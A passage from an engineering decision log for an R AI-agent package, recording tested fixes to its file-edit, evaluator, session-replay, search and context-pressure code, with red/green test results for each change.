   edit's `newText` inside a JSON-string `edits` (the shape Pi's shim exists for), a single
   object or a data frame failed with `oldText must not be empty`. `edit_envelope_of()` (and so
   `edit_nested_input()`) now puts `edits` through the shim first, and returns the envelope
   string when the field is a one-element list.
10. **A string naming a file or a URL was read as the edits.** `jsonlite::fromJSON()` treats a
    string that is not valid JSON as a file name or an http(s) URL (jsonlite 2.0.0 opens
    `file()` or `url()` on it), so a model-supplied `edits` naming a local JSON file applied that
    file's edits, and a URL would have been fetched. The shim uses P01's `json_decode()`
    (`jsonlite::parse_json()`, the same `simplifyVector = FALSE` semantics as conventions
    section 6, written for exactly this reason in P01).
11. **Match search was quadratic in the number of matches.** `gregexpr(fixed = TRUE)` took 9 s
    for 200,000 matches in a 5 MB text (a `replace_all`, or the uniqueness count of a short
    `oldText` in a large file). `fixed_positions()` now uses `strsplit()` and byte counts (0.03
    s, same positions: leftmost, non-overlapping).

Independent review round 1 (each reproduced, then a regression test written and seen red):
12. **A deleted or moved name was read as a wildcard pattern.** `unlink()` expands `*`, `?` and
    `[...]` by default, so `*** Delete File: [abc].R` deleted `a.R` and `b.R`, kept `[abc].R` and
    then failed, `*** Delete File: *.R` deleted every `.R` file, and moving `x?.R` also deleted
    `xy.R`. `patch_remove()` calls `unlink(p, expand = FALSE)`. (The plan's `file.remove()` never
    expanded, but removed empty directories, item 4.)
13. **A move onto the same file spelled differently deleted it.** Item 2 compared the old and new
    names as strings (only a final link followed, only ASCII case folded), so on APFS `ete.R ->
    ETE.R` with accented letters, an NFC -> NFD rename and `a.R -> L/a.R` (`L` a link to the
    directory) wrote the file and then removed its only copy. `patch_finish_move()` now asks the
    file system after the write: an old name that is still a link is another entry and only the
    link is removed; an old name that now reads as the bytes just written is the same entry and
    is renamed to the new spelling (so a case-only rename takes effect; before, the name kept its
    old case); any other old name is removed. A move to a link of the old file replaces the link
    and removes the old name. A rename-first move was not used: when the old name is a link to
    the new name, `rename()` puts a link to itself in place of the file before the write, and a
    move across devices needs the write-then-remove path anyway.
14. **An `oldText` of only whitespace matched between every two characters.** Fuzzy normalisation
    makes it empty, and the empty needle matched at every byte: with `replace_all`, `\t -> X` on
    `ab\ncd\n` wrote `aXbX\nXcd\nab\ncXdX\n`; without it the error was `Found 5 occurrences`,
    and a unique exact tab could not be edited at all (the uniqueness count found an empty match
    per byte). `fixed_positions()` returns no position for an empty needle, so such an edit fails
    with Pi's `Could not find ...` text. The plan-literal source has the same defect.
15. **Two operations on one file through a directory link or a folded name were not refused.**
    `patch_key()` builds the key from the link target with its existing part resolved by
    `normalizePath()` (directory links followed; the stored spelling on macOS and Windows) and, on
    a case-insensitive file system, folds the whole key (Unicode lower case and NFC through
    stringi, ASCII case without it). `L/a.R` + `D/a.R`, a non-ASCII case pair, an NFC/NFD pair and
    two `*** Add File` names that differ only in case are refused. Limitation: names not created
    yet are compared exactly on a case-sensitive file system, also on a normalisation-insensitive
    one (APFS case-sensitive).
16. **A last line removed through the fuzzy view left its trailing whitespace behind.** For `x =
    1\ny = 2   ` (no final newline), the hunk `-y = 2` became `\ny = 2`, which also matches
    exactly at the start of the last line, so the result was `x = 1   `. A block found at the end
    of the fuzzy view only is now widened from the file's own last lines; the line before keeps
    its bytes.
17. **A move onto an existing directory** failed with a base R connection error after the earlier
    operations were written (found while verifying item 13). It is refused before anything is
    written: `Could not move file: <path> to <dest>. Error code: EISDIR.`

Internal additions: `edit_source()` (the loading half of the plan's `edit_compute()`, which now
takes an optional `src`), `edit_view()`, `edit_reasons()`, `patch_line_end()`,
`patch_hunk_edits()`, `patch_remove()`, `patch_key()`, `patch_finish_move()`.

Validation: `progress/P10.md`, Task 6. Eleven blocks (53 expectations) were added to the plan's
15 blocks, which are unchanged. Against the plan-literal source the implementer's test file gives
`[ FAIL 32 | WARN 1 | SKIP 0 | PASS 88 ]` (`task6-red-plan-literal.log`; every failure is in an
added block). Implementation green: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 132 ]` in the UTF-8 and the
C locale (`task6-green-final.log`, `task6-green-clocale.log`). Review round 1 added 4 blocks and 4
expectations in 2 added blocks (30 expectations in all). Against the pre-fix source the final
test file gives `[ FAIL 17 | WARN 5 | SKIP 0 | PASS 126 ]`, every failure in those 30
(`task6-fix1-red-final.log`). Final `^tool-edit$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 162 ]` in
both locales (`task6-fix1-green.log`, `task6-fix1-green-clocale.log`).

## D-054 - P09 evaluator: TEMPORARY skip of the gptr-shim test until P08 adds gptr_return(); P08 Task 10 MUST remove it (2026-10-04)

P09 Task 8 runs in an early lane, before P08. One plan test needs P08's exported
`gptr_return()`: "the gptr shim reaches gptr:: when gptr is not visible from envir"
(`tests/testthat/test-eval-core.R`). It evaluates `r = gptr_return(5)` in a
`new.env(parent = baseenv())` home, so it needs a real `gptr::gptr_return`. Coordinator decision
for the sequencing: that one test gets the guard
`skip_if_not(exists("gptr_return", envir = asNamespace("gptr"), inherits = FALSE), ...)` and its
body stays verbatim. `gptr_return()` is not stubbed. The shim itself (`gptr_shim()`, Task 1)
is implemented and unit-tested in `test-eval-guard.R`.

**The guard is TEMPORARY.** P08 Task 10 ("The session SDK verbs"), which adds `gptr_return()`,
MUST delete the two comment lines and the two-line `skip_if_not()` call at the top of that
block, then show the test passing (2 expectations) in its evidence. Until then `^eval-core$`
reports `SKIP 1`. Tracked in `HANDOFF.md` (cross-plan obligations) and `progress/P09.md`
("Pending removal").

## D-055 - P09 evaluator: session changes are taken before gptr renders the plots; added promises and active bindings show their kind; non-ASCII and invalid names never make eval_r() throw; code that is not valid UTF-8 is a parse error; a message sink the code leaves open is undone; values print with the home's print methods (2026-10-04)

P09 Task 8's plan-literal `eval_r()` helpers (`R/eval-core.R`) and Task 2's `env_diff()`
(`R/env-snapshot.R`) were changed in the six ways below. Items 1-4 were found by a probe of the
plan-literal source (`dev/.validation/P09/task8-eval-core-plan-literal.R`), items 5 and 6 by
review round 1 and refined in review round 2. The signatures of `eval_r()` and `env_diff()`, the `gptr_eval_result` fields,
the statuses, the event types and the plan's 24 test blocks (19 in `test-eval-core.R`, 5 in
`test-copy-eval.R`) are unchanged.

1. **Session changes are compared before the plots are rendered.** Rendering to PNG is gptr's
   own work. The first plot of a process loads ragg, systemfonts and textshaping, and the plan
   reported them as `changes$loaded`, which tells the model its code loaded them. This holds for
   every first `r` call that plots. `eval_finish()` now stores `eval_session_state()` in
   `st$state1` after `eval_restore()` and before `eval_plots_done()`, and `eval_result()` uses
   it. Where nothing ran (blocked, parse error) it falls back to a fresh state. The `TZDIR`
   rule is kept, because the evaluated code can format a time too.
2. **An added promise or active binding shows its kind.** `delayedAssign()` and
   `makeActiveBinding()` gave `+ p <NA NA>`, because the snapshot has no class or shape for
   bindings it never forces. They are now `+ p <promise>` and `+ ab <active>`, as the `~`
   lines already did, and the binding stays unforced.
3. **Non-ASCII and invalid object names never make `eval_r()` throw.** `ls()` returns a name
   parsed from code, such as `donn<e9>es = 1:3`, with unknown encoding. R's radix sort refuses
   such a string ("Character encoding must be UTF-8, Latin-1 or bytes"), so `env_diff()` threw
   after the code had run, and the result was lost (04 section 2.2: evaluation failures never
   throw). `env_diff()` now orders the exact names by their display text, `env_text()`, still
   with `method = "radix"`. The `+`/`~`/`-` lines pass names, classes and shapes through
   `env_text()`, so a name that is not valid UTF-8 shows as `a<ff>` and the lines are valid
   UTF-8 (IC-62; D-040 item 2). R makes the check on the first key only, when it is a
   character vector, and looks at its first element (probe on R 4.5.0 with the unknown-encoded
   `x = c("<e4>ndern", "b")`: `order(x)` and `order(x, c(1, 2))` throw, `order(rev(x))` and
   `order(c(1, 1), x)` do not). `workspace_lines()` orders by
   `order(-size, snapshot$name, method = "radix")`, whose first key is numeric; with the names
   `<e4>ndern` alone and with `b` it returned the lines without an error, so it is unchanged.
4. **Code that is not valid UTF-8 after `as_utf8()` is a `parse_error`.** The plan's `gsub()`
   threw "input string 1 is invalid" (with a translation warning) before parsing. Model code
   arrives as JSON and is always valid, but `!expr` and `ctx$eval()` callers can pass bytes.
   `eval_parse()` now returns the error `<gptr>: the code is not valid UTF-8 text; nothing was
   evaluated.` and nothing runs. In a non-UTF-8 locale `as_utf8()` reads such bytes as native
   text, so this cannot happen there.
5. **A message sink the code leaves open is undone.** The plan restores only output sinks
   (those at or above its own). `eval_r()` stops at the first error, so code such as
   `sink(zz, type = "message"); library(x); sink(type = "message")` never reaches its reset
   line when `library(x)` fails, and the user's later errors, warnings and messages went into
   the code's file for the rest of the session. `eval_open()` now notes
   `sink.number(type = "message")` in `st$msg_sink`. When it differs at the restore,
   `eval_msg_sink_reset()` resets messages to stderr and, when the user had a message sink of
   their own, points them back to that connection while it is still open. The code's
   connection is its own object in the home and stays open. `eval_restore()` resets the
   message sink before it closes the capture connection (review round 2): while output is
   captured, `stdout()` is that connection, so `sink(stdout(), type = "message")` points
   messages at it, and the plan's `close(st$con)` then threw "cannot close 'message' sink
   connection" out of `eval_r()` (04 section 2.2), with `st$restored` already set, so the
   options, the `askYesNo` trap, the plot device and the message sink stayed changed and the
   user's later messages and errors went into an anonymous file. The close is now wrapped in
   `tryCatch()`, so no restore step can skip the ones after it. A capture connection that
   `eval_read_sink()` reopened, after the code closed both it and the user's message sink
   connection, can take the user's connection number; `eval_msg_sink_reset()` never points
   messages at it and falls back to stderr.
6. **A visible value prints with the print methods visible from the home.** The plan's
   `eval_print()` called `print(value)` from the gptr namespace, so S3 methods were looked up
   from there (globalenv() and the search path). A method that the code defined in another home
   (a function frame, the plan-mode scratch overlay, an inline sub-agent overlay) printed `x`,
   which 04 prints as `print(<sym>)` in the home, but not `(x)` or `f(x)`. `eval_print()` now
   does what R's console does (`PrintValueEnv()`): for an object or a function it evaluates
   `print(x)` in a short-lived child of the home, with `x` bound to the value. Other values
   print as in the plan, with `print(value)`, as the console prints them without dispatch
   (review round 2): binding the empty symbol, which `formals(f)$a` or `alist(a = )$a` returns
   for an argument without a default, to `x` made `print(x)` fail with 'argument "x" is
   missing', so the evaluation stopped with status `error` where the console prints a blank
   line. S4 objects still go through `show()`. Before
   it returns, the binding is removed and the child is detached (`parent.env(pe) =
   emptyenv()`). A child left pointing at a function-frame home counts as a reference to the
   frame, so R keeps the frame's arguments referenced after the function returns, and the
   user's next edit copies them: without the detach, the plan's two function-frame copy rows
   and the added one each counted 1 copy (`task8-fix1-mutant-nodetach.log`).

Validation: `progress/P09.md`, Task 8. For items 1-4, four blocks were added to
`test-eval-core.R` (23 expectations) and one to `test-env-snapshot.R` (5). Against the
plan-literal sources they give `[ FAIL 5 | WARN 0 | SKIP 1 | PASS 220 ]` for
`^(eval-core|env-snapshot)$` (`task8-red-adaptations.log`). For items 5 and 6 (review round 1),
two blocks were added to `test-eval-core.R` (20 expectations) and one block of two rows to
`test-copy-eval.R`. Against the round-0 source, `^(eval-core|copy-eval)$` gives
`[ FAIL 8 | WARN 0 | SKIP 1 | PASS 204 ]` (`task8-fix1-red.log`). For review round 2, one
block was added to `test-eval-core.R` (37 expectations) and 4 expectations to the print block.
Against the round-1 source, `^eval-core$` gives `[ FAIL 35 | WARN 0 | SKIP 1 | PASS 192 ]`
(`task8-fix2-red.log`); the reused-number check alone, against the reordered restore, gives
`[ FAIL 2 | WARN 0 | SKIP 1 | PASS 229 ]` (`task8-fix2-red-slot.log`). Final
`^(eval-core|copy-eval|env-snapshot)$`: `[ FAIL 0 | WARN 0 | SKIP 1 | PASS 325 ]`
(`task8-fix2-green.log`). Under `LC_ALL=C`, the three UTF-8-only blocks skip, and
`^(eval-core|env-snapshot)$` gives `[ FAIL 0 | WARN 0 | SKIP 4 | PASS 283 ]`
(`task8-fix2-green-clocale.log`).

## D-056 - P06 replay functions: header ids, value= names, models and document fields are checked first, doc is optional, a reconstruction is all or nothing, a header turn is one whole number, a session rebuilt for a replay takes model, mode and frozen prompt from the cut path, a reconstructed history stays reconstructed when rebuilt from its file (2026-10-04)

P06 Task 14's literal `session_replay_apply()` and `session_replay_new()` are changed in six
ways. P15's replay (the `document` route of IC-45/IC-46) and P19's team replay consume them:

1. **The header fields that name things are checked before anything is looked up or recorded.**
   `header$session` must pass `check_session_id()` (Task 3, D-050 item 2), `header$value` must
   be one non-empty string, and `header$model` one non-empty string whose parts before and after
   its first `/` are both non-empty (04 section 11.5 records `provider/id`; a name without `/`
   is kept as given, as `model_canonical()` keeps it); otherwise `gptr_error_invalid_argument`
   with `arg = "header$session"`, `"header$value"` or `"header$model"`. In the plan a non-string
   or two-element id raised base R's unclassed `get0()` error in `session_by_id()`, a path-like id
   was refused only by `session_new()` (`arg = "opts$id"`), a bad `value=` reached `exists()`
   after the `gptr.replay` entry had been appended, and a model such as `"fake/"` or `"/x"` was
   refused by P01's `msg_assistant()` (`arg = "model"`) after the session had been registered
   and its user message written to its file (review round 1).
2. **`doc` defaults to `NULL`, its fields are checked, and a reconstruction is all or nothing.**
   IC-46 (section 15) calls `session_replay_new(block, header, envir)`; 04 section 7.6 lists `doc`
   as a fourth argument. The default satisfies both. `path`, `format`, `template` and `text` must
   be one string or `NULL`, `code` and `output` character vectors without NA. In the plan a
   two-element template became the joined prompt `"a\nb"`, and `text = 1` failed in P01's
   `as_content()` after the session had been registered under the recorded id, so the next replay
   of that id returned the half-built session. Any other failure after the session is created (a
   store error, an interrupt) is now undone as `store_rebuild()` undoes a rebuild: an `on.exit()`
   in `session_replay_new()` (`replay_undo()`) forgets the live session, restores the last
   session, releases the lock and removes the file this call created (a file that already existed
   when the store opened is kept), so neither this process nor a later one finds a half-built
   transcript under the recorded id; the condition propagates unchanged (review round 1). The
   plan's `replay_reconstruct(header, envir, doc)` is split into `replay_session_new(header,
   envir)` and `replay_reconstruct(s, header, doc)` for this, and the adoption of the block
   (`kind`, `block`, `doc`, `replay_mark()`) moved into `replay_adopt()`. A session rebuilt for a
   replay relies on `store_rebuild()`'s own all-or-nothing up to the rebuilt session (contract
   note in `progress/P06.md`).
3. **A header turn is one whole number >= 0, else unknown** (`replay_turn()`). The plan's
   `as.integer()` truncated `"1.5"` and failed with "the condition has length > 1" for a
   two-element turn, after the session was registered. An unknown turn means no cut for a rebuilt
   session and turn 1 for a reconstruction (the plan's default); a reconstruction is at least
   turn 1, since it always holds a user message.
4. **A session rebuilt for a replay takes its model, mode and frozen prompt from the cut path.**
   The plan moved the leaf back to the recorded turn and re-derived the turn, last answer, values
   and status, but kept what `store_rebuild()` had read from the full path. A model change, a mode
   change (to `auto`, for instance) or an IC-52 refreeze inside a later turn then decided how the
   replayed session continued. `replay_rebuild()` now re-reads them with Task 13's
   `rebuild_model()`, `rebuild_mode()` and `rebuild_frozen()`, the rule of D-050 item 3 (the
   frozen prompt only when the file is not foreign, whose `refreeze` stays set).
5. **A reconstructed answer that was not recorded does not point to absent code.** The plan's
   placeholder said "its code is above" even when no code was recorded; that clause is now added
   only when the `r` call is reconstructed. `last_text` stays `NA` (plan).
6. **A history reconstructed from a document stays reconstructed when its file is rebuilt.**
   A reconstruction writes its JSONL under the recorded id, so a later process (or this one after
   the session was collected) rebuilds it from that file, and the plan's `history_source` was then
   `"store"`: the IC-46 notice of a later live continuation was never given, although the
   transcript is the same approximate one. `store_rebuild()` (Task 13's `rebuild_fill()`, so
   `gptr_resume()` too) and `replay_rebuild()` (from the cut path) now set `history_source` with
   `history_source_of()`: `"reconstructed"` when the path holds a message only a reconstruction
   writes (a user message with source `replay`, or an assistant message with api `replay`, which
   a foreign rebuild's `imported` marking leaves intact), else `"store"` (review round 1).

Validation: `progress/P06.md`, Task 14 (`test-session-object.R`). Four blocks (45 expectations)
were added to the plan's eight, and three more (34 expectations) in review round 1. Against the
plan-literal source the first four gave 13 failures and 399 passes, all failures in the added
blocks (`task14-literal.log`); the round-1 blocks gave 11 failures against the first
implementation (`task14-fix1-red.log`). Final `^session-object$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 463 ]` in the UTF-8 and the C locale (`task14-fix1-green.log`,
`task14-fix1-green-C.log`).

## D-057 - P10 grep, find and ls: a searched file and the relevance sort work with non-ASCII names in a C locale, the whole-file prefilter never drops a matching file, ls skips names that are not valid UTF-8, a failed long-line locate leaks no warning, a match-limit failure is always reported and costs only its own lines, a skipped file over 20 MB is always reported (2026-10-04)

P10 Task 7's plan-literal `R/tool-search.R` passes the plan's 13 blocks (56 expectations, the
ripgrep oracle included) in the UTF-8 and the C locale, and its (file, line) sets equal
ripgrep's on 8 patterns over `R/`, `tests/` and `dev/spec/` (`dev/.validation/P10/task7-probe-rg-repo.log`).
One defect, reproduced against that source (`task7-probe-plan-literal-clocale.log`,
`task7-probe2-plan-literal-clocale.log`); review round 1 found three more (items 2-4,
`task7-fix1-probe*-before.log`), review round 2 two more (item 2's backreferences and item 5,
`task7-fix2-probe1-before.log`) and review round 3 two more (item 2's skipped pattern text and
item 6, `task7-review3-probe-possessive.log`, `task7-review3-probe-bigfile.log`). Item 3 adds the
`invalid_names` attribute of `search_ls()`, item 5 adds the "results may be incomplete" notice to
the texts and prints that had none, and item 6 adds the plan's skipped-file notice where it was
missing. No signature, class, column or other Pi text changes.
1. **`basename()` of a marked UTF-8 non-ASCII path stops in a non-UTF-8 locale** ("unable to
   translate ... to native encoding"; the base-R limit behind D-041 item 4 and D-051 item 6). Two
   plan calls hit it. `grep_candidates()` labelled a single searched file with `basename(root)`,
   so `search_grep("x", "<dir>/café.R")` failed; `find_relevance()` took `basename(paths)`, so
   `search_find(sort = "relevance")` failed as soon as the walk met one non-ASCII name anywhere
   under the root. Both now use the new `search_basename()` (`sub("(?s)^.*/", "", p, perl =
   TRUE)`, marked with `as_utf8()`); the paths are already "/"-separated (`resolve_tool_path()`,
   `walk_files()`).
2. **The whole-file `(?m)` prefilter dropped matching files** (report 21 section 2.1; report 11
   section 2.5, the same (file, line) sets as ripgrep). It must keep every file the per-line
   matcher matches, but the plan switched it off only for `\A`, `\z`, `\Z`, `\G`, a leading verb
   and an `(?s)` flag. At a line edge the per-line subject has no neighbour while the whole file
   has "\n", so these constructs failed in the whole file where the line matched: negative
   lookaround (`,(?!\s)` on a line ending with a comma, `(?<!\s)#` at a line start, `(*nla:`),
   possessive quantifiers and atomic groups (`a\s*+$` and `a(?>\s*)$` consume the newline and
   cannot give it back), conditionals (`q(?(?=\s)x|)$`), a verb after the start (`x(*COMMIT)y`
   ends the scan at the file's first `x`), and an inline `(?-m)` or `(?^)` (they unset the
   prefilter's multiline flag). The file was dropped before the per-line matcher ran, so its
   matches were lost without a notice, and whether a line was reported depended on unrelated
   lines. `rg -P` and the per-line matcher report every one of them. The prefilter is now also
   off for `(*` anywhere, `(?!`, `(?<!`, `(?>`, `(?(`, an option group containing `-` or `^`,
   and a possessive quantifier (`*+`, `++`, `?+`, `}+`). Over-matching, inside `\Q...\E` or on an
   escaped `\*+`, only costs the prefilter's speed. 22 common patterns keep the prefilter
   (`task7-fix1-probe4-prefilter-active.log`), and the ripgrep comparison over `R/`, `tests/`
   and `dev/spec/` is unchanged (`task7-fix1-probe-rg-repo.log`). Review round 2: a capture made
   inside a positive lookaround is atomic too, so a backreference to it (`a(?=(\s*))\1$`, the
   atomic-group idiom) lost `ws.R:1` the same way (`rg -P` reports it). Backreferences (`\1`-`\9`,
   `\g`, `\k`, `(?P=`) now switch the prefilter off. The possessive test now reads `}+` only after
   a quantifier brace (`{n}`, `{n,m}`, `{,m}`), so `\p{L}+`, `\x{E9}+` and `\N{U+00E9}+` keep the
   prefilter (`task7-fix2-probe4.log`). Review round 3: PCRE2 looks for the possessive `+` only
   after skipping `\Q`, `\E`, `(?#...)` comments and, under an `x` or `xx` option, white space and
   `#` comments. So `a\s*\E+$`, `a\s*\Q\E+$`, `a\s*(?#c)+$`, `(?x:a\s* +$)`, `(?ix)A\s* +$` and
   `(?xx)a\s* +$` were possessive although the test saw no `*+`, and lost `ws.R:1` (`rg -P`
   reports it; `task7-review3-probe-possessive.log`). The prefilter is now also off for `\Q`,
   `\E`, `(?#` and an option group containing `x`. An option setting or a callout between a
   quantifier and `+` is a compile error, so PCRE2 skips nothing else there
   (`task7-fix3-probe1-after.log`). A `fixed = TRUE, ignore_case = TRUE` pattern, which reaches
   PCRE as `\Q...\E`, is literal: the test now skips it, so it keeps the prefilter, even with
   `*+` or `\E` in its text (`task7-fix3-probe2.log`). The round-3 probe shows no dropped file
   after the fix (`task7-fix3-probe-possessive-after.log`), and the ripgrep comparison over `R/`,
   `tests/` and `dev/spec/` still agrees on every non-empty row (`task7-fix3-probe-rg-repo.log`).
3. **`search_ls()` listed with `list.files()` directly**, bypassing D-041 item 7. A name that
   is not valid UTF-8 (Latin-1 bytes on Linux in a UTF-8 locale) reached `tolower()` in the name
   sort, which threw "invalid input ... in 'utf8towcs'", so `ls` failed for the whole
   directory. It now lists through the walker's `walk_list_dir()`, skips such names before
   `as_utf8()` and counts them in a new `invalid_names` attribute, as `walk_files()` does.
   `search_find()` already carried the walker's count. The Pi texts are unchanged.
4. **The long-line locator leaked PCRE warnings** (report 11 section 7.1 risk 3).
   `grep_cap_lines()` runs the pattern again on a line longer than 500 characters to centre the
   window. That `regexpr()` was outside the warning handler, so a match-limit error on such a
   line leaked "PCRE error 'match limit exceeded'" from `grep_tool_text()` and `print()`.
   This happened even for a context line, and although `search_grep()` had already recorded
   `incomplete`. The locator now runs under `suppressWarnings()`; a failed locate gives -1 and
   the window starts at the beginning of the line.
5. **A PCRE match-limit failure was not always reported, and in the prefilter it lost whole
   files** (report 11 section 7.1 risk 3; the plan's "captured and reported as 'results may be
   incomplete'"). `grep_tool_text()` and `print.gptr_matches()` returned "No matches found"
   before building any notice, and `print.gptr_files()` had no incomplete note, so a search
   whose only candidate lines hit the limit read as a clean empty result. Worse, the whole-file
   `(?m)` prefilter returns `FALSE` for a file on which it hits the limit, so every line of that
   file was dropped, including lines the per-line matcher matches cheaply. `(a+)+$` over
   `cat.txt` = 600 `a`, `b`, then `aaa` gave "No matches found" with no notice (`rg -P` reports
   "match limit exceeded" for the file); `((a|\s)+)+b` over twelve `aaaa` lines, `x` and `aab`
   lost `f.txt:14` (`rg -P` finds it) and claimed `incomplete`, although no line hits the limit.
   The empty texts and both prints now carry the notice when `incomplete` is set. When the
   prefilter warns for a batch, each file of the batch is tried alone, and only the files that
   hit the limit go to the per-line matcher; the prefilter's own failure no longer sets
   `incomplete`, which now records only lines that hit the limit themselves. The reviewer's
   sketch sent the whole batch on. It was not used because it also scans every non-matching file
   of the batch line by line; the added prefilter check fails against it
   (`task7-fix2-red-batch.log`). Over three `R/` files, `(\w+\s?)+$` now finds the per-line
   matcher's 258 rows instead of 240, in 9.3 s instead of 7.9 s; the per-line matcher alone
   takes 9.8 s (`task7-fix2-probe3.log`).
6. **A file larger than 20 MB was skipped without its notice unless rows remained** (the plan's
   "Files larger than 20 MB are skipped with a notice"; review round 3). `grep_tool_text()`
   returned "No matches found" before it built the note, and `print.gptr_matches()` and
   `print.gptr_files()` never showed `skipped_big`. Model code in `r` sees results through these
   prints (`gptr$grep()`), so a skipped file went unreported there
   (`task7-review3-probe-bigfile.log`). The new `search_skipped_note()`, next to
   `search_incomplete_note()`, gives "<n> file(s) larger than 20MB skipped" to the direct text and
   to both prints, with or without rows, before the incomplete note. `search_find()` and
   `search_ls()` results carry no `skipped_big` and print no note
   (`task7-fix3-probe-bigfile-after.log`).

Validation: `progress/P10.md`, Task 7. Added block "non-ASCII file and directory names are
searched, found and listed in any locale" (7 expectations, under
`withr::local_locale(c(LC_CTYPE = "C"))`). Against the plan-literal source:
`[ FAIL 1 | WARN 0 | SKIP 0 | PASS 57 ]`, the block erroring at `basename(root)`; with only the
first fix `[ FAIL 1 | WARN 0 | SKIP 0 | PASS 58 ]`, erroring at `basename(paths)`
(`task7-red-final-plan-literal.log`, `task7-red-final-relevance.log`). Items 2-4 add the
blocks "the whole-file prefilter never drops a file the per-line matcher matches" (14
expectations), "ls skips and counts an entry whose name is not valid UTF-8, as the walker does"
(4) and "a match-limit error while placing a long line's window leaks no warning" (6). The
final test file against the reviewed source (scratch copy, working tree untouched):
`[ FAIL 15 | WARN 3 | SKIP 0 | PASS 72 ]` (`task7-fix1-red-final.log`). The 15 failures are the
12 prefilter rows, the missing `invalid_names` and 2 leaked warnings; the 3 WARN are leaked
warnings. Round-1 `^tool-search$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 87 ]` in the UTF-8 and
the C locale (`task7-fix1-green.log`, `task7-fix1-green-clocale.log`). Review round 2 adds 4
backreference rows and a brace check to the prefilter block, and the block "a match-limit failure
is reported without rows and loses only the lines it hits" (13 expectations). The final test file
against the round-1 source (scratch copy) gives `[ FAIL 13 | WARN 0 | SKIP 0 | PASS 91 ]`
(`task7-fix2-red-final.log`), before the brace check was added. The brace check alone failed on
the in-tree source before its fix: `[ FAIL 1 | WARN 0 | SKIP 0 | PASS 104 ]`
(`task7-fix2-red-brace.log`). Round-2 `^tool-search$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 105 ]`
in the UTF-8 and the C locale (`task7-fix2-green.log`, `task7-fix2-green-clocale.log`). Review
round 3 adds the blocks "a skipped file over 20 MB is reported with or without rows, in the text
and prints" (10 expectations, a sparse 21 MB fixture) and "the prefilter is off when ignorable
pattern text precedes a possessive +" (8 pattern rows and 2 checks that a fixed case-insensitive
pattern and an `(?i)` pattern keep the prefilter). Against the round-2 source (in tree, before
the fix): `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 110 ]` (`task7-fix3-red.log`): 7 missing notices
and the 8 rows. Final `^tool-search$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 125 ]` in the UTF-8 and
the C locale (`task7-fix3-green.log`, `task7-fix3-green-clocale.log`).

## D-058 - P09 model text: the context-pressure check reads the session's own last request, takes all-unknown token counts as no evidence, and survives a failing compact.should (2026-10-04)

P09 Task 9's plan-literal `eval_pressure()` (`R/eval-format.R`) was changed in three ways. The
signature of `format_eval_result()`, its result fields, its text layout and the plan's 10 test
blocks (`tests/testthat/test-eval-format.R`) are unchanged; `eval_budget()` is plan-literal.

1. **Only the session's own usage rows count.** The plan took the last row of
   `session_data(s)$usage`. P06's `usage_add()` charges every request to the session and to each
   live ancestor (root charging, IC-66), so the last row of a parent can be a child's (a
   sub-agent) request, whose context is not the parent's. The row's `session` column holds the
   requesting session's id, and `eval_pressure()` now keeps the rows with
   `session == session_data(s)$id` before it takes the last one.
2. **All-unknown token counts are not zero.** IC-74 (`spec/07-local-ollama.md` section 5):
   "Missing usage remains unknown." When every token count of that row (input, cache read, both
   cache writes, output) is `NA`, the plan summed them to 0 and asked `compact.should(s, 0, 0)`.
   The check now returns `FALSE` (no evidence of pressure, no halving) without asking. Partly
   known rows still sum their known counts, as in the plan.
3. **A failing `compact.should` never fails the `r` result.** The service call is wrapped in
   `tryCatch(..., error = function(e) FALSE)`, as P06's `run_compact_check()` wraps the same
   service. An evaluation never throws (04 section 2.2); its formatter, which runs after the
   code's side effects, now cannot throw because of P07 either.

P07 is not implemented, so without a registered `compact.should` the budget is never halved
(the plan's "absent: no halving"). Validation: `progress/P09.md`, Task 9. Two added blocks, "context
pressure asks compact.should with twice the session's last request" (7 expectations) and
"format_eval_result halves its budget while the session is under pressure" (3), mock
`session_data()`, `ext_service_has()`, `ext_service_get()`, `eval_session()` and
`eval_pressure()`. Against the plan-literal source
(`dev/.validation/P09/task9-eval-format-plan-literal.R`): `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 34 ]`
(`task9-red-adaptations.log`). The child row is counted (18200 tokens instead of 3200, then
`TRUE` instead of `FALSE`), the all-`NA` row is asked (3 calls instead of 2), and the failing
service throws "compactor failed".

## D-059 - P06 ctx.kernel: session verbs need a session ctx, ctx$run honours the ctx's own run id, set_model records the thinking level and refuses bad input at once, append_entry refuses unencodable data and gptr.* types, an abort inside the dispatcher waits for the call and a call whose own hook aborted is not executed, members see the run executing on the stack, a pending switch applies when the run settles, an abort while a request is prepared starts no transfer (2026-10-04)

P06 Task 15's literal `ctx_kernel()` (`R/agent-run.R`, the `ctx.kernel` service of IC-34 behind
the P06 members of 04 section 10.6) is changed in these ways. The member names, their argument
lists and P02's calling convention are the plan's; the plan's 9 test blocks pass unchanged.

1. **A process-level ctx** (`ctx$session` `NULL`): `send`, `set_model` and `append_entry`
   signal `gptr_error_invalid_argument` with `arg = "ctx"` instead of base R errors from
   `session_enqueue(NULL)` and `session_data(NULL)`; `state` returns `NULL`.
2. **`ctx$run` falls back to the run id the ctx was created for** (P02's `ctx_new(session,
   run)`) when the kernel finds no run. Without it, registering the kernel broke P02's
   `test-ext-api.R:399` (`ctx_new(NULL, run = list(id = "u1"))$run` gave `NULL`).
3. **`set_model(ref, thinking)` records the level and refuses bad input at once.** `thinking`
   must be one of P05's levels (`arg = "thinking"`); the reference is resolved purely
   (IC-74) and a decision-only model refused (D-017) before anything changes, also inside a run
   (the plan set `pending_model` unchecked, and the user's run failed at its next request). The
   level is passed as the reference's `:<level>` suffix, so P05 clamps it and the
   `model_change` entry carries it (`gptr$thinking`); the plan wrote no entry at all for a
   thinking-only change and an entry without the level otherwise. `run_target()` applies a
   pending switch the same way. Router references keep the plan's behaviour.
4. **`append_entry(type, data)` refuses before appending**: data `json_encode()` cannot encode
   (`arg = "data"`; the plan's `session_append()` had already added the entry in memory when the
   store failed), and a resulting `gptr.<type>` (`arg = "type"`): those entry types belong to
   gptr (04 section 4.6) and its readers trust them (`rebuild_mode()` would let a plugin whose
   source is `plugin:gptr` switch a resumed session to `auto` with a `gptr.mode_change`).
5. **`send()` labels its own queue item** (by its position before the enqueue), not the last item,
   which a `queue_update` hook may have added.
6. **`abort()` inside the dispatcher only raises the run's abort signal**: while a tool executes
